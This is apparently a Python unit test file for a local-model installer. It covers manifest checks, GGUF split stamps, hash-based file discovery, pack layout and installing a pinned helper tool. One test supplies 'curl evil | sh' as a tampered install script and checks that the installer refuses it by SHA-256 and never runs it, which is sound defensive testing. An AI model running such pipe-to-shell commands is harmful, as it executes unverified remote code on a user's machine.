"""the installer, without the network: the manifest's checks, a GGUF's split stamp read, written and hashed as
published, the user's files found (by bytes, then SHA-256 - their names free), a pack laid out from them.

    python3 -m unittest tools/install/test_install.py
"""
import hashlib
import json
import os
import struct
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import layout  # noqa: E402
import manifest  # noqa: E402
import host  # noqa: E402
import rig  # noqa: E402
import stamp  # noqa: E402
import userfiles  # noqa: E402

REAL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "packs.json")
REV = "2688c0c3c2c3b052ec4f6d10a8417b0ef7ee4eba"


def gguf(path, no, count, payload):
    """a GGUF v3 of no tensors: split.no (no - 1) and split.count, uint16 each as unsloth's are, then `payload`"""
    def s(t):
        b = t.encode()
        return struct.pack("<Q", len(b)) + b
    head = b"GGUF" + struct.pack("<IQQ", 3, 0, 2)
    head += s("split.no") + struct.pack("<IH", 2, no - 1) + s("split.count") + struct.pack("<IH", 2, count)
    with open(path, "wb") as f:
        f.write(head + payload)


def sha(path):
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


def put(path, data):
    with open(path, "wb") as f:
        f.write(data)


def entry(path, repo="r/a", revision=REV, **kw):
    e = {"repo": repo, "revision": revision, "path": "dir/" + os.path.basename(path), "bytes": os.path.getsize(path),
         "sha256": sha(path)}
    e.update(kw)
    return e


RIG_PIN = {"repo": "me/rig", "version": "v1.0.0", "install_sha256": "0" * 64}


class Manifest(unittest.TestCase):
    def test_real(self):
        m = manifest.load(REAL)
        self.assertRegex(m["rig"]["version"], r"^v[0-9]+\.[0-9]+\.[0-9]+$")
        self.assertEqual(set(m["packs"]), {"ud-iq1_s", "ud-iq1_m"})
        self.assertEqual(m["packs"]["ud-iq1_s"]["table"]["slot"], [5, 5])

    def refused(self, mutate, why):
        m = json.load(open(REAL))
        mutate(m)
        with self.assertRaisesRegex(manifest.ManifestError, why):
            manifest.check(m)

    def test_refusals(self):
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].update(revision="main"), "pinned")
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].update(sha256="abc"), "sha256")
        self.refused(lambda m: m["files"]["ud-iq1_s-2"].pop("bytes"), "bytes")
        self.refused(lambda m: m["packs"]["ud-iq1_s"]["shards"].append("nope"), "nope")
        self.refused(lambda m: m["packs"]["ud-iq1_s"]["table"].update(slot=[6, 5]), "slot")
        self.refused(lambda m: m["packs"]["ud-iq1_s"].update(shards=[]), "shards")
        self.refused(lambda m: m["rig"].update(version="latest"), "rig")             # a tag, not a moving name
        self.refused(lambda m: m["rig"].update(install_sha256="abc"), "rig")
        self.refused(lambda m: m.pop("rig"), "rig")
        self.refused(lambda m: m.update(version=2), "version")


class Stamp(unittest.TestCase):
    def test_read_write_canonical(self):
        with tempfile.TemporaryDirectory() as d:
            a, b = os.path.join(d, "a.gguf"), os.path.join(d, "b.gguf")
            gguf(a, 1, 1, b"table" * 1000)
            gguf(b, 1, 1, b"table" * 1000)
            published = sha(a)
            self.assertEqual(stamp.read(a), (1, 1))
            stamp.write(b, 5, 5)
            self.assertEqual(stamp.read(b), (5, 5))
            self.assertNotEqual(sha(b), published)
            self.assertEqual(stamp.canonical_sha256(b, (1, 1)), published)   # restamped: verifies as published
            self.assertEqual(os.path.getsize(b), os.path.getsize(a))
            with open(b, "r+b") as f:                                       # a payload byte changed: does not
                f.seek(-1, 2)
                f.write(b"X")
            self.assertNotEqual(stamp.canonical_sha256(b, (1, 1)), published)

    def test_no_stamp(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "x.gguf")
            with open(p, "wb") as f:
                f.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
            with self.assertRaises(stamp.StampError):
                stamp.read(p)


class UserFiles(unittest.TestCase):
    def test_found_by_bytes_and_hash(self):
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "src")
            os.makedirs(os.path.join(src, "deep"))
            want = os.path.join(src, "deep", "renamed.bin")
            put(want, b"shard" * 999)
            decoy = os.path.join(src, "decoy.bin")                     # the same size, other bytes
            put(decoy, b"shard" * 998 + b"XXXXX")
            e = entry(want)
            self.assertEqual(userfiles.find(e, [src]), os.path.realpath(want))
            e2 = dict(e, sha256="0" * 64)
            self.assertIsNone(userfiles.find(e2, [src]))
            self.assertIsNone(userfiles.find(e2, [src], trust_size=True))  # small: hashed whatever the flag
            big = os.path.join(src, "shard.gguf")                          # large (sparse): by its bytes alone
            with open(big, "wb") as f:
                f.truncate(userfiles.TRUST_FROM)
            eb = {"repo": "r/a", "revision": REV, "path": "x/shard.gguf", "bytes": userfiles.TRUST_FROM,
                  "sha256": "0" * 64}
            self.assertEqual(userfiles.find(eb, [src], trust_size=True), os.path.realpath(big))
            self.assertIsNone(userfiles.find(eb, [src]))

    def test_trust_size_still_hashes_small_files(self):
        with tempfile.TemporaryDirectory() as d:
            a, b = os.path.join(d, "a", "osmos-picks.bin"), os.path.join(d, "b", "osmos-picks.bin")
            os.makedirs(os.path.dirname(a))
            os.makedirs(os.path.dirname(b))
            put(a, b"A" * 4096)
            put(b, b"B" * 4096)                                      # the same size: two packs' profiles
            self.assertEqual(userfiles.find(entry(b), [d], trust_size=True), os.path.realpath(b))
            self.assertEqual(userfiles.find(entry(a), [d], trust_size=True), os.path.realpath(a))

    def test_table_restamped_found(self):
        with tempfile.TemporaryDirectory() as d:
            pub = os.path.join(d, "pub.gguf")
            gguf(pub, 1, 1, b"engram" * 2000)
            e = entry(pub, stamp=[1, 1])
            mine = os.path.join(d, "mine", "table-5of5.gguf")
            os.makedirs(os.path.dirname(mine))
            gguf(mine, 5, 5, b"engram" * 2000)
            os.remove(pub)
            self.assertEqual(userfiles.find(e, [os.path.join(d, "mine")]), os.path.realpath(mine))


class Layout(unittest.TestCase):
    def test_pack_from_user_files(self):
        with tempfile.TemporaryDirectory() as d:
            have, models = os.path.join(d, "have"), os.path.join(d, "models")
            os.makedirs(have)
            shards = []
            for i in (1, 2):
                p = os.path.join(have, f"M-0000{i}-of-00003.gguf")
                gguf(p, i, 3, b"w%d" % i * 500)
                shards.append(p)
            table = os.path.join(have, "engram.gguf_file")
            gguf(table, 1, 1, b"t" * 3000)
            picks = os.path.join(have, "osmos-picks.bin")
            put(picks, b"p" * 64)
            table_before = sha(table)
            m = {"version": 1, "rig": RIG_PIN, "files": {
                "s1": entry(shards[0]), "s2": entry(shards[1]), "tab": entry(table, stamp=[1, 1]),
                "pk": entry(picks, repo="me/osmos", revision=None)},
                "packs": {"p": {"title": "t", "shards": ["s1", "s2"], "table": {"file": "tab", "slot": [3, 3]},
                                "picks": "pk", "drafter": [], "overlay": None,
                                "settings": {"budget_gib": 110, "no_guess": True}}}}
            manifest.check(m)
            out = layout.lay(m, "p", models, [have], trust_size=False, abliterated=False, fetch=None)
            pack = os.path.join(models, "p")
            self.assertTrue(os.path.islink(os.path.join(pack, "M-00001-of-00003.gguf")))
            t3 = os.path.join(pack, "M-00003-of-00003.gguf")
            self.assertEqual(stamp.read(t3), (3, 3))
            self.assertEqual(sha(table), table_before)                  # the user's table: not written
            self.assertEqual(stamp.canonical_sha256(t3, (1, 1)), table_before)
            with open(os.path.join(pack, "osmos.json")) as f:
                cfg = json.load(f)
            self.assertEqual(cfg["model"], os.path.join(pack, "M-00001-of-00003.gguf"))
            self.assertTrue(cfg["no_guess"] and cfg["picks"].endswith("osmos-picks.bin") and not cfg.get("overlay"))
            self.assertEqual(out, os.path.join(pack, "osmos.json"))

    def test_missing_unpublished_refused(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "x.bin")
            put(p, b"x")
            m = {"version": 1, "rig": RIG_PIN, "files": {"pk": entry(p, repo="me/osmos", revision=None)},
                 "packs": {"p": {"title": "t", "shards": ["pk"], "table": None, "picks": None, "drafter": [],
                                 "overlay": None, "settings": {}}}}
            manifest.check(m)
            with self.assertRaisesRegex(layout.LayoutError, "not published"):
                layout.lay(m, "p", os.path.join(d, "models"), [], trust_size=False, abliterated=False, fetch=None)


class Host(unittest.TestCase):
    def test_tools_named_before_anything_runs(self):
        have = {"git", "make", "gcc", "hipcc", "hf"}
        which = lambda n: f"/usr/bin/{n}" if n in have else None          # noqa: E731
        self.assertTrue(host.tools(True, True, which, lambda p: False)[0])
        have.discard("hf")
        ok, why = host.tools(True, True, which, lambda p: False)
        self.assertFalse(ok)
        self.assertIn("hf", why)                                         # a download needs it: named first
        self.assertTrue(host.tools(False, True, which, lambda p: False)[0])    # every file the user's: not needed
        have.discard("hipcc")
        ok, why = host.tools(False, True, which, lambda p: False)
        self.assertFalse(ok)
        self.assertIn("hipcc", why)
        self.assertTrue(host.tools(False, True, which, lambda p: p == "/opt/rocm/bin/hipcc")[0])  # ROCm's own path
        self.assertTrue(host.tools(False, False, which, lambda p: False)[0])  # --no-build: no build tools


class Rig(unittest.TestCase):
    CFG = {"pack": "ud-iq1_s", "model": "/m/ud-iq1_s/M-00001-of-00005.gguf", "max_context": 1048576}

    PIN = {"repo": "mrsirg97-rgb/rig", "version": "v3.5.0", "install_sha256": hashlib.sha256(b"echo hi\n").hexdigest()}

    def test_ensure_leaves_a_rig_alone(self):
        ran = []
        self.assertEqual(rig.ensure(self.PIN, lambda: "/usr/bin/rig", lambda url: self.fail(url),
                                    lambda script, env: ran.append(env)), "/usr/bin/rig")
        self.assertEqual(ran, [])

    def test_ensure_installs_the_pinned_rig(self):
        found = iter([None, "/home/u/.local/bin/rig"])
        got, ran = [], []
        exe = rig.ensure(self.PIN, lambda: next(found), lambda url: got.append(url) or b"echo hi\n",
                         lambda script, env: ran.append((script, env)))
        self.assertEqual(exe, "/home/u/.local/bin/rig")
        self.assertEqual(got, ["https://raw.githubusercontent.com/mrsirg97-rgb/rig/v3.5.0/install.sh"])
        self.assertEqual(ran[0][0], b"echo hi\n")
        self.assertEqual(ran[0][1]["RIG_VERSION"], "v3.5.0")                     # its binary the pinned release's

    def test_ensure_refuses_a_script_not_the_pinned_one(self):
        ran = []
        with self.assertRaisesRegex(rig.RigError, "SHA-256"):
            rig.ensure(self.PIN, lambda: None, lambda url: b"curl evil | sh\n", lambda s, e: ran.append(s))
        self.assertEqual(ran, [])                                                   # never run

    def test_ensure_refuses_an_install_that_left_no_rig(self):
        with self.assertRaisesRegex(rig.RigError, "no rig"):
            rig.ensure(self.PIN, lambda: None, lambda url: b"echo hi\n", lambda s, e: None)

    def test_window_under_the_reply_refused(self):
        with tempfile.TemporaryDirectory() as home:                   # rig refuses reserve >= window: refused first
            with self.assertRaises(rig.RigError):
                rig.register(home, dict(self.CFG, max_context=65536), "/b/osmos-api", "/m/osmos.json", default=False)
            self.assertFalse(os.path.exists(os.path.join(home, "models.json")))

    def test_row_added_others_kept(self):
        with tempfile.TemporaryDirectory() as home:
            theirs = [{"id": "local", "window": 32768, "maxTokens": 4096, "reserve": 4096, "keepRecent": 8192,
                       "command": "llama-server --port ${PORT}", "port": 8090}]
            with open(os.path.join(home, "models.json"), "w") as f:
                json.dump(theirs, f)
            row = rig.register(home, self.CFG, "/opt/osmos/bin/osmos-api", "/m/ud-iq1_s/osmos.json", default=False)
            with open(os.path.join(home, "models.json")) as f:
                rows = json.load(f)
            self.assertEqual(rows[0], theirs[0])                          # theirs, as it was
            self.assertEqual(rows[1], row)
            self.assertEqual(row["id"], "osmos-ud-iq1_s")
            self.assertIn("${PORT}", row["command"])
            self.assertEqual(row["efforts"], ["low", "high", "max"])      # the levels osmos-api maps
            self.assertEqual((row["maxTokens"], row["reserve"]), (262144, 262144))  # a 256K thinking budget
            self.assertTrue(row["port"] != 8090 and row["window"] == 1048576)
            self.assertFalse(os.path.exists(os.path.join(home, "settings.json")))
            again = rig.register(home, self.CFG, "/opt/osmos/bin/osmos-api", "/m/ud-iq1_s/osmos.json", default=False)
            with open(os.path.join(home, "models.json")) as f:
                self.assertEqual(len(json.load(f)), 2)                    # its own row replaced, not doubled
            self.assertEqual(again["port"], row["port"])

    def test_default_when_asked(self):
        with tempfile.TemporaryDirectory() as home:
            with open(os.path.join(home, "settings.json"), "w") as f:
                json.dump({"model": "local", "theme": "dark"}, f)
            rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=True)
            with open(os.path.join(home, "settings.json")) as f:
                s = json.load(f)
            self.assertEqual(s, {"model": "osmos-ud-iq1_s", "theme": "dark"})

    def test_malformed_refused_untouched(self):
        with tempfile.TemporaryDirectory() as home:
            p = os.path.join(home, "models.json")
            put(p, b"[{not json")
            with self.assertRaises(rig.RigError):
                rig.register(home, self.CFG, "/b/osmos-api", "/m/osmos.json", default=False)
            with open(p, "rb") as f:
                self.assertEqual(f.read(), b"[{not json")


if __name__ == "__main__":
    unittest.main()
